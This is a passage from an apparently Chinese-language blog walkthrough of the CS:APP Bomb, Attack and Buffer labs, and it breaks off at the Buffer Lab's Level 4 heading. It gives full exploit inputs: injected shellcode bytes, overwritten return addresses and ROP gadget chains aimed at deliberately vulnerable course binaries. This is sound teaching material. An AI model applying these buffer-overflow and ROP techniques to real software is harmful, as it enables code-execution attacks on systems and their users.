class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 判断每个数都在1～6之间，且互不相同</span></span><br><span class="line">    <span class="keyword">while</span> (++r12d != <span class="number">6</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> ai = *(a + i);</span><br><span class="line">        <span class="keyword">if</span> (!(ai - <span class="number">1</span> &lt;= <span class="number">5</span> &amp;&amp; ai - <span class="number">1</span> &gt;= <span class="number">0</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> aj = *(a + j);</span><br><span class="line">        <span class="keyword">while</span> (i != j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ai == aj) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            j++;</span><br><span class="line">            aj = *(a + j);</span><br><span class="line">        &#125;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        a[i] = <span class="number">7</span> - a[i];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">ans</span>[6];</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> t = a[i] - <span class="number">1</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">cur</span> =</span> head;</span><br><span class="line">        <span class="keyword">while</span> (t--) cur = cur-&gt;nxt;</span><br><span class="line">        ans[i] = cur;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ot[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        ot[i] = ans[i]-&gt;val;</span><br><span class="line">    <span class="comment">// ot 必须单调减</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; <span class="number">6</span>; j++)</span><br><span class="line">            <span class="keyword">if</span> (ot[i] &lt;= ot[j]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="lab3-attack">Lab3: Attack</h4>
<p>实验说明书见：<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">http://csapp.cs.cmu.edu/3e/attacklab.pdf</a></p>
<p>这次实验一定得好好参考实验指导书，否则单单看那个<code>README</code>完全不知道该做什么。指导书说的很明白，我们需要用<code>hex2raw</code>来将一个字节转化为对应的字符，方便我们的输入。因为我们运行<code>ctarget</code>和<code>rtarget</code>时需要输入的就是一串字符串，来引起缓冲区溢出，使得程序运行一些我们想要的操作。</p>
<p>这个实验分为两部分，第一部分是没有栈随机化处理的程序<code>ctarget</code>，第二部分是有栈随机化处理的程序<code>rtarget</code>。共有<code>touch1</code>, <code>touch2</code>, <code>touch3</code>三个函数是我们跳转的目标，里面又有一些不同的要求。</p>
<p>同时实验指导书中还说明<code>ctarget</code>和<code>rtarget</code>要传入一些命令行参数，<code>-q</code>能够让程序不要给服务器发送我们的运行结果，对于我们自学的同学必须加上，不然是运行不了的。（テ_デ毕竟我们又不在CMU），通过<code>-i FILE</code>可以把文件<code>FILE</code>作为输入传给程序。当然个人觉得<code>./ctarget &lt; FILE</code>直接重定向不就好了嘛（？</p>
<h5 id="touch1">touch1</h5>
<p><code>touch1</code>只需要我们跳转到这，就能运行<code>validate(1)</code>，使得我们成功完成第一题。我们使用<code>objdump -d ctarget &gt; ctarget.s</code>反汇编得到<code>ctarget</code>的汇编代码，查找一下<code>touch1</code>这个函数的位置，就能发现它在地址<code>0x4017c0</code>处，因此我们只需要让我们的输入能够溢出，覆盖原本的ret地址即可。我们再查看<code>test()</code>函数中的<code>getbuf()</code>函数，发现它有<code>sub $0x28, %rsp</code>给栈分配了40字节的空间，因此我们只需要给栈填入如下的内容，即可修改原本的返回地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|00 00 00 00 00 40 17 c0| &lt;- ret</span><br><span class="line">|00 00 00 00 00 00 00 00| \</span><br><span class="line">|00 00 00 00 00 00 00 00|  \</span><br><span class="line">|00 00 00 00 00 00 00 00|   - buf</span><br><span class="line">|00 00 00 00 00 00 00 00|  /</span><br><span class="line">|00 00 00 00 00 00 00 00| /</span><br></pre></td></tr></table></figure>
<p>因此我们可以新建一个<code>touch1.txt</code>文件，文件内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>运行<code>hex2raw</code>并把输出通过管道传给<code>ctarget</code>即可</p>
<p>执行<code>./hex2raw &lt; touch1.txt | ./ctarget -q</code>即可通过第一题。</p>
<h5 id="touch2">touch2</h5>
<p>指导书中给出了<code>touch2(unsigned val)</code>函数，我们知道需要传入一个参数，而且参数必须和给我们的cookie相等，才能运行<code>validate(2)</code>从而通过第二题。同时我们知道调用<code>touch2</code>时，传入的参数是存在<code>%rdi</code>中的。（可以复习一下，调用函数时，整数或指针的参数不超过6个时，按照%rdi, %rsi, %rdx, %rcx, %r8, %r9的顺序进行调用）因此我们需要做的就是先让<code>%rdi</code>存储我们的cookie值，再调用<code>touch2</code>函数，相比上一题，就是多了一步需要先传一次值。查找一下知道<code>touch2</code>函数的位置在<code>0x4017ec</code>中。此时我们希望我们的程序能先运行<code>movq $0x59b997fa, %rdi</code>，那就需要将这个指令注入程序里，那该放在哪里呢？最简单的想法是不是把这几条指令放在我们的输入的buf中。在我们给<code>%rdi</code>赋值为我们的cookie后，还需要跳转到<code>touch2</code>，所以我们需要执行的汇编指令应该是以下几条</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>指导书中给了我们提示，我们可以将上述汇编指令存入<code>asm2.s</code>文件中，使用<code>gcc -c asm2.s</code>得到<code>asm2.0</code>，再使用<code>objdump -d asm2.o</code>即可反汇编得到上述指令的机器码。</p>
<p><img src="/images/《CSAPP》实验解析/attack_touch2.png" alt="attack_touch2" style="zoom:50%;" /></p>
<p>因此我们可以在输入的内容中插入上述的指令，再修改ret的地址，让其跳转到我们输入指令的位置。最简单的位置肯定是将上述指令放在<code>getbuf</code>分配的栈的栈顶，因为我们可以直接查看到这个位置是什么。在0x4017a8处分配了栈空间之后，我们可以利用gdb调试工具，在0x4017ac处打个断点，再运行程序至断点后，查看一下%rsp的位置，即是我们注入代码的位置，如下图所示，%rsp位于0x5561dc78</p>
<p><img src="/images/《CSAPP》实验解析/attack_gdb.png" alt="attack_gdb" style="zoom:50%;" /></p>
<p>因此我们可以新建<code>touch2.txt</code>文件，内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>同第一题的操作，即可通过第二题。</p>
<h5 id="touch3">touch3</h5>
<p>看看指导书给出的<code>touch3</code>和<code>hexmatch</code>函数，我们知道我们要传入的参数是一个指针，同时这个指针指向的字符串是我们的cookie，也就是"59b997fa"，所以我们要给寄存器%rdi传入一个地址，这个地址指向的字符串是“59b997fa“。但是题目的提示中说了，在调用<code>hexmatch</code>的时候，可能会覆盖<code>getbuf</code>函数的栈帧，主要是因为<code>hexmatch</code>中用了<code>char *s = cbuf + random() % 100;</code>会导致指针s的位置偏移，所以可能会覆盖原来<code>getbuf</code>的栈帧。因此我们需要找到一个比较安全的位置来存放我们的cookie字符串，很自然的想到我们可以利用<code>test</code>函数的栈帧来存储这个字符串。而且这也是里我们最近的位置，最容易覆盖。我们先将字符串“59b994fa”转化为对应的十六进制 ASCII 码值，为<code>35 39 62 39 39 37 66 61</code>，这里可以用<code>man ascii</code>来对照查找得到。给出一个栈帧的图解如下，上一题中我们已经查看确定了分配40字节的栈帧后，%rsp为0x5561dc78</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x5561dca8 |61 66 37 39 39 62 39 35| - test</span><br><span class="line">0x5561dca0 |00 00 00 00 55 61 dc 78| - ret</span><br><span class="line">0x5561dc98 |00 00 00 00 00 00 00 00| \</span><br><span class="line">0x5561dc90 |00 00 00 00 00 00 00 00|  \</span><br><span class="line">0x5561dc88 |00 00 00 00 00 00 00 00|   - getbuf</span><br><span class="line">0x5561dc80 |00 00 00 00 00 00 00 00|  /</span><br><span class="line">0x5561dc78 |00 00 00 00 00 00 00 00| /</span><br></pre></td></tr></table></figure>
<p>之后与上一题类似，我们将%rdi设为<code>0x5561dca8</code>，即为我们所需要的地址，然后再返回到<code>touch3</code>即可。同时可查看到<code>touch3</code>的地址为<code>0x4018fa</code></p>
<p>写出汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>之后与上一题一样，反汇编得到机器码即可。</p>
<p>因此我们可以确定我们需要将栈填充如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x5561dca8 |61 66 37 39 39 62 39 35| - cookie string</span><br><span class="line">0x5561dca0 |00 00 00 00 55 61 dc 78| - ret</span><br><span class="line">0x5561dc98 |00 00 00 00 00 00 00 00| \</span><br><span class="line">0x5561dc90 |00 00 00 00 00 00 00 00|  \</span><br><span class="line">0x5561dc88 |00 00 00 00 00 00 00 00|   - getbuf</span><br><span class="line">0x5561dc80 |00 00 00 c3 00 40 18 fa|  /</span><br><span class="line">0x5561dc78 |68 55 61 dc a8 c7 c7 48| /</span><br></pre></td></tr></table></figure>
<p>最终可以确定我们要输入的文件<code>touch3.txt</code>的内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
<p>接下来两题开启了栈随机化，对比前三题，我们能发现区别在于，我们不能再像前三题一样，直接跳转到%rsp或是%rsp的相对位置上，因为%rsp的地址由于栈随机化每次运行都会不同。当然就按照《CSAPP》上说的，栈随机化是可以通过暴力破解的。比如我们拿着第二题的<code>touch.txt</code>，不断提交给<code>rtarget</code>，可能某一次就随机分配的位置正好就和我们第二题中给出的那个<code>0x5561dc78</code>相同，然后就能过了第四题了！（bushi</p>
<p>按照实验指导书给出的指导，我们知道处理之后两题的思路应该是：利用程序中多出的一些指令，我们跳转到该位置，相当于我们挑选出程序中现有的一些机器码，让其执行，从而达到我们的一些目的。实验指导书给出要求，第四题我们可利用的程序中的代码范围是<code>start_farm</code>到<code>mid_farm</code>，在本人反汇编得到的汇编文件中，是在915行到953行的位置。第五题可用的范围是<code>start_farm</code>到<code>end_farm</code>，也就是915行到1097行。同时指导书中还给出了几张表格，给出了一些汇编指令与机器码的对应。因此我们接下来两题的思路就应该是，从题目给定的代码范围中，挑出一些机器码来执行，从而实现我们想要的一些对应的汇编指令。</p>
<h5 id="rtouch2">rtouch2</h5>
<p>跟第二题一样，我们要把%rdi设为我们的cookie值，然后跳转去执行<code>touch2</code>。问题在于我们现在不能直接将cookie值mov到%rdi中，毕竟程序中显然没有这条指令对应的机器码。那我们可以想办法曲线救国，先利用缓冲区溢出，把cookie值塞到栈中，之后再<code>popq %rdi</code>，这样就可以把%rdi设为我们的cookie值了。指导书给出了<code>popq %rdi</code>对应的机器码是<code>5f</code>，搜索一下发现在<code>start_farm</code>到<code>end_farm</code>这一段根本没有这个机器码。然后笔者一怒之下把popq表格中的那些机器码都搜索了一下，发现只有<code>58</code>，也就是<code>popq %rax</code>，在这段代码中存在。所以想到只要先<code>popq</code>到<code>%rax</code>中，再把<code>%rax</code>处的值转给<code>%rdi</code>即可。再查表知<code>movq %rax, %rdi</code>对应的机器码为<code>48 89 c7</code>，我们查找一下这段机器码，很幸运的发现在这段代码中是存在这个机器码的。因此我们需要利用以下两条。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4019a7: 8d 87 51 73 58 90	leq -0x6fa78caf(%rdi), %eax</span><br><span class="line">4019bb: c3					retq</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4019c3: c7 07 48 89 c7 90	movl $0x90c78948, (%rdi)</span><br><span class="line">4019cf: c3					retq</span><br></pre></td></tr></table></figure>
<p>因此我们只需要先ret至<code>0x4019ab</code>，即可执行<code>popq %rax</code>，再跳转至<code>0x4019c5</code>，即可执行<code>movq %rax, %rdi</code>。让%rdi得到cookie值之后，最后再跳转至<code>touch2</code>即可。也就是我们希望栈帧如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|00 00 00 00 00 40 17 ec| - ret to touch2</span><br><span class="line">|00 00 00 00 00 40 19 c5| - ret to mov</span><br><span class="line">|00 00 00 00 59 b9 97 fa| - poped to %rax</span><br><span class="line">|00 00 00 00 00 40 19 ab| - ret to pop</span><br><span class="line">|00 00 00 00 00 00 00 00| \</span><br><span class="line">|00 00 00 00 00 00 00 00|  \</span><br><span class="line">|00 00 00 00 00 00 00 00|   - buf</span><br><span class="line">|00 00 00 00 00 00 00 00|  /</span><br><span class="line">|00 00 00 00 00 00 00 00| /</span><br></pre></td></tr></table></figure>
<p>从而我们可以新建<code>rtouch2.txt</code>，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>执行命令<code>./hex2raw &lt; rtouch2.txt | ./rtarget -q</code>即可知道通过了level 2 with target rtarget.</p>
<h5 id="rtouch3">rtouch3</h5>
<p>最后一题其实和前面相比并没有多出什么特殊的技巧，只是做起来特别繁琐，个人做完之后认为这题的意义并不算很大。当然实验指导书也写了，说这题就5分，即使不做也能拿到95的高分了，如果有别的要紧事就可以不用做了。</p>
<p>我们知道这一题是要我们在有栈随机化保护的条件下运行<code>touch3</code>。和第三题类似，我们的思路应该是将我们的cookie对应的字符串"59b997fa"注入程序中，然后将注入的地址传给寄存器%rdi，再去执行<code>touch3</code>，即可通过这道题。但是在第三题中我们可以明确知道我们注入的绝对地址。但是这题我们并不知道<code>%rsp</code>的地址，所以自然也不知道我们注入位置的绝对地址，但是我们是可以知道我们注入的位置和<code>%rsp</code>相比的相对地址的。比如说我们注入的字符串位置在栈顶下的24字节，那位置自然是<code>%rsp + 0x18</code>。再读一读<code>start_farm</code>到<code>end_farm</code>之间的指令，发现它正好留了一个<code>add_xy</code>给我们使用，也就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4019d6: 48 8d 04 37		leq (%rdi, %rsi, 1), %rax</span><br><span class="line">4019e0: c3				retq</span><br></pre></td></tr></table></figure>
<p>到这里思路应该已经很明确了，就是我们要把%rsp的值mov给%rdi，然后根据我们塞入的字节数，决定我们要将%rsp偏移多少，将这个值存入%rsi，然后就可以调用上面这条指令，计算得到我们存入的字符串的地址了。最后把这个存在%rax中的地址mov给%rdi，再调用<code>touch3</code>即可。</p>
<p>把%rsp传给%rdi只需要通过%rax中转，在代码中找到<code>48 89 e0</code>与<code>48 89 c7</code>的地址即可。</p>
<p>但是要把一个值传给%rsi，就十分的繁琐，经过不断的搜索尝试，发现可以通过这条路径<code>%eax -&gt; %edx -&gt; %ecx -&gt; %esi</code>来给%rsi传递值，只需要和前面一样找到对应的机器码地址即可。</p>
<p>然后我们可以确定我们的栈应该填充成这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|61 66 37 39 39 62 39 35| - cookie string</span><br><span class="line">|00 00 00 00 00 40 18 fa| - ret to touch3</span><br><span class="line">|00 00 00 00 00 40 19 c5| - movq %rax, %rdi</span><br><span class="line">|00 00 00 00 00 40 19 d6| - leq(%rdi, %rsi, 1), %rax 即%rax = %rsp + x</span><br><span class="line">|00 00 00 00 00 40 1a 13| - movl %ecx, %esi</span><br><span class="line">|00 00 00 00 00 40 1a 70| - movl %edx, %ecx</span><br><span class="line">|00 00 00 00 00 40 19 dd| - movl %eax, %edx</span><br><span class="line">|           x           | - 等待确定的偏移量</span><br><span class="line">|00 00 00 00 00 40 19 ab| - popq %rax</span><br><span class="line">|00 00 00 00 00 40 19 c5| - movq %rax, %rdi</span><br><span class="line">|00 00 00 00 00 40 1a 06| - movq %rsp, %rax</span><br><span class="line">|00 00 00 00 00 00 00 00| \</span><br><span class="line">|00 00 00 00 00 00 00 00|  \</span><br><span class="line">|00 00 00 00 00 00 00 00|   - buf</span><br><span class="line">|00 00 00 00 00 00 00 00|  /</span><br><span class="line">|00 00 00 00 00 00 00 00| /</span><br></pre></td></tr></table></figure>
<p>在<code>getbuf</code>要ret时，我们在11行处将%rsp的值保存了下来，最终存到%rdi中，此时的%rsp指向的是第10行，因为执行11行前，程序使用ret，弹出此时栈顶的值传给ret，也就是11行的内容，并将%rsp减8，指向新的栈顶，ret之后执行<code>movq %rsp, %rax</code>，因此传给%rax的%rsp的值是指向第10行的。我们最终要指向的字符串在第一行，也就是需要偏移9 * 8字节 = 72字节，因此x的值应为<code>0x48 (72)</code>，从而我们就确定了我们的栈应该填充的所有内容。我们可以新建一个<code>rtouch3.txt</code>文件，保存以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">70 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
<p>同第四题一样提交，即可通过本题。</p>
<h4 id="lab4-buffer">Lab4: Buffer</h4>
<p>实验说明书见：<a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf">http://csapp.cs.cmu.edu/3e/buflab32.pdf</a></p>
<p>本实验已被Lab3替代，但笔者的强迫症还是把本实验给写了一下，虽然两者基本相同，但也稍微学到了一点新东西。</p>
<p>这个实验和Lab3基本相同，不同之处主要在本实验使用的是IA-32的架构。简单来说就是一个字是只有4字节的，不像x86-64有8字节。还有一点就是本实验需要理解基址寄存器%ebp，其余的笔者认为与Lab3并不大的不同。我们还是先使用<code>objdump -d bufbomb &gt; bufbomb.s</code>反汇编得到汇编文件。之后就是参照实验指导书一题题完成就好。</p>
<p>本文实验需要先使用<code>./makecookie USERID</code>来生成cookie，一些题目也需要与cookie相对应，笔者使用<code>./makecookie gahow</code>生成了cookie为<code>0x7709aec3</code>，本文之后不加说明的使用笔者自己的id和cookie，在参考时请把cookie对应部分的内容替换为自己的。</p>
<h5 id="level0-candle">Level0: Candle</h5>
<p>题目要我们跳转到<code>smoke</code>函数，可以说和Lab3的第一题要求简直一模一样。我们还是去看一下<code>getbuf</code>的汇编代码，我们看到程序实际上是将buffer的首地址设为了<code>-0x28(%ebp)</code>，因此我们知道栈如下图所示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|xx xx xx xx| - ret</span><br><span class="line">|xx xx xx xx| - %ebp</span><br><span class="line">|xx xx xx xx| \</span><br><span class="line">|xx xx xx xx|  \</span><br><span class="line">|xx xx xx xx|   \</span><br><span class="line">|xx xx xx xx|    \</span><br><span class="line">|xx xx xx xx|      - 共有36字节的buffer</span><br><span class="line">|xx xx xx xx|    /</span><br><span class="line">|xx xx xx xx|   /</span><br><span class="line">|xx xx xx xx|  /</span><br><span class="line">|xx xx xx xx| /</span><br></pre></td></tr></table></figure>
<p>和Lab3一样，查看一下<code>smoke</code>函数的地址，在<code>0x08048c18</code>，因此我们只需要首先用40字节填充之前的内容，再用4字节填充ret的地址即可。给出文件<code>candle.txt</code>如下，使用指令<code>./hex2raw &lt; candle.txt | ./bufbomb -u gahow</code>即可通过第一题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">18 8c 04 08</span><br></pre></td></tr></table></figure>
<h5 id="level1-sparkler">Level1: Sparkler</h5>
<p>跟Lab3的第二题对应，需要我们把传入的值修改为自己的cookie，再调用<code>fizz</code>函数。不同之处在于，我们查看<code>fizz</code>函数，可以发现它执行了<code>mov 0x8(%ebp), %eax</code>，再将<code>%eax</code>与存在内存<code>0x804d108</code>的cookie值进行比较，因此我们不能直接给某个寄存器直接赋值为我们的cookie，我们的做法应该在<code>0x8(%ebp)</code>的位置注入我们的cookie值，再执行即可。因此栈空间如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|77 09 ae c3| - cookie</span><br><span class="line">|00 00 00 00| - 0x4(%ebp)</span><br><span class="line">|xx xx xx xx| - %ebp</span><br><span class="line">|xx xx xx xx| \</span><br><span class="line">     ...       - buffer</span><br><span class="line">|xx xx xx xx| /</span><br></pre></td></tr></table></figure>
<p>因此我们只需要将上一题的ret地址改为<code>fizz</code>的地址<code>0x08048c42</code>，并在上一题的文件中添加两行，一行用于填充<code>0x4(%ebp)</code>，一行在<code>0x8(%ebp)</code>这个位置填充我们的cookie即可。给出文件<code>sparkler.txt</code>，内容如下，即可通过本题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">42 8c 04 08</span><br><span class="line">00 00 00 00</span><br><span class="line">c3 ae 09 77</span><br></pre></td></tr></table></figure>
<h5 id="level2-firecracker">Level2: Firecracker</h5>
<p>这一题要我们先修改<code>global_value</code>的值为我们的cookie，再调用<code>bang</code>函数，比个人觉得比Lab3的第三题要简单。我们只需要知道全局变量<code>global_value</code>存的地址，再使用我们自己生成的命令，修改这个地址处的值就好了。简单的使用gdb随意打个断点，运行<code>bufbomb</code>，使用<code>p &amp;global_value</code>，即可知道<code>global_value</code>的地址为<code>0x804d100</code>，再查看一下<code>bang</code>函数的地址为<code>0x08048c9d</code>，从而我们可以写出以下汇编指令。文件名为<code>asm2.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl $0x7709aec3, 0x804d100</span><br><span class="line">push $0x8048c9d</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>按照实验指导书的说明，我们使用<code>gcc -m32 -c asm2.s</code>，即可以32位的架构编译这段汇编语言，再使用<code>objdump -d asm2.o</code>，即可得到机器码。</p>
<p><img src="/images/《CSAPP》实验解析/buf_level2.png" alt="buf_level2" style="zoom:50%;" /></p>
<p>与Lab3类似，我们使用gdb查看一下buffer顶部即<code>-0x28(%ebp)</code>的地址，即可知道地址为<code>0x556837e8</code>，从而我们可以写出文件<code>firecracker.txt</code>，内容如下，即可通过本题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c7 05 00 d1</span><br><span class="line">04 08 c3 ae</span><br><span class="line">09 77 68 9d</span><br><span class="line">8c 04 08 c3</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">e8 37 68 55</span><br></pre></td></tr></table></figure>
<h5 id="level3-dynamite">Level3: Dynamite</h5>
<p>由于<code>getbuf</code>的返回值默认是1，本题要我们修改<code>getbuf</code>的返回值为我们的cookie，再假装无事发生，让程序正常返回去执行<code>test</code>函数。笔者起初很天真的以为只需要和上一题一样简单的用我们注入的指令，修改一下<code>%eax</code>的值，再ret回<code>test</code>函数原本该返回的地址就好了。这样操作之后发现并不能过这道题。然后回去认真看了一下指导书中的<code>test</code>函数，发现它生成了一个<code>local</code>的值，如果这个值被修改了，那程序就会检测到这一点，从而导致我们无法通过。这就是书中介绍的金丝雀保护法的思想，在栈中插入一段随机生成的值，如果在返回时发现这段值不同了，则说明缓冲区必然溢出了，从而中段程序的运行。</p>
<p>我们去读一读<code>test</code>函数的汇编代码，发现它用<code>call 8048d90 &lt;uniqueval&gt;</code>得到返回值之后，将这个属于<code>local</code>的值存入了<code>-0xc(%ebp)</code>中，当<code>getbuf</code>返回之后，又访问<code>-0xc(%ebp)</code>的值，将它与<code>uniqueval</code>函数生成的值比较，看看它是否发生了变化。因此我们可以发现，<code>test</code>的栈帧中已经分配了0x24的空间，我们溢出的那几行机器码，是不会覆盖到<code>-0xc(%ebp)</code>的，重点在于我们之前粗暴的用<code>00 00 00 00</code>覆盖掉了<code>%ebp</code>的值，导致返回之后<code>-0xc(%ebp)</code>与原本正确的地址不同，因此我们只需要小心的维护好<code>%ebp</code>的值即可。我们使用gdb调试，<code>b test</code>给<code>test</code>函数打一个断点，运行之后来查看一下<code>%ebp</code>的值本该是多少，在我们缓冲区溢出时，对<code>%ebp</code>的位置设为它原本的值即可。即为<code>0x55683840</code></p>
<p><img src="/images/《CSAPP》实验解析/buf_level3.png" alt="buf_level3" style="zoom:50%;" /></p>
<p>查看<code>test</code>函数可以知道，在<code>getbuf</code>返回之后，正常我们应该返回的地址为<code>0x8048dbe</code>，之后我们的做法和上一题完全一样，写出汇编代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl $0x7709aec3, %eax</span><br><span class="line">push $0x8048dbe</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>跟上一题一样可以得到机器码。从而确定出我们的文件<code>dynamite.txt</code>，内容如下，即可通过本题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b8 c3 ae 09</span><br><span class="line">77 68 be 8d</span><br><span class="line">04 08 c3 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">40 38 68 55</span><br><span class="line">e8 37 68 55</span><br></pre></td></tr></table></figure>
<h5 id="level4-nitroglycerin">Level4: Nitroglycerin</h5>
